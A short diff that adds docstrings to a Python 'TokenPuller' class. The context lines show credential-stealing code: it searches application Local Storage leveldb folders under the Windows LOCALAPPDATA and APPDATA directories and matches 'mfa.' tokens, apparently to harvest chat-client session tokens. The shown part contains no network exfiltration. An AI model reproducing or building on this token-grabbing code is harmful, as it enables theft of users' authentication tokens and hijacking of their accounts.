@@ -40,6 +40,14 @@ class TokenPuller:
     MFA_TOKEN_REGEX = re.compile(r"mfa\.[\w-]{84}")
 
     def get_tokens_from_path(self, path: str) -> List[str]:
+        """
+        Returns the tokens from the path.
+
+        :param str path: The path.
+        :return: The list of tokens
+        :rtype: List[str]
+        """
+
         path += "/Local Storage/leveldb"
 
         if not os.path.exists(path):
@@ -65,6 +73,13 @@ class TokenPuller:
 
     @staticmethod
     def get_paths() -> List[str]:
+        """
+        Returns the paths.
+
+        :return: The paths.
+        :rtype: List[str]
+        """
+
         local = os.getenv("LOCALAPPDATA")
         roaming = os.getenv("APPDATA")
 
@@ -82,6 +97,14 @@ class TokenPuller:
         ]
 
     def get_tokens(self) -> List[str]:
+        """
+        Returns the tokens.
+        Most wont be valid.
+
+        :return: The tokens.
+        :rtype: List[str]
+        """
+
         tokens = []
 
         for path in self.get_paths():
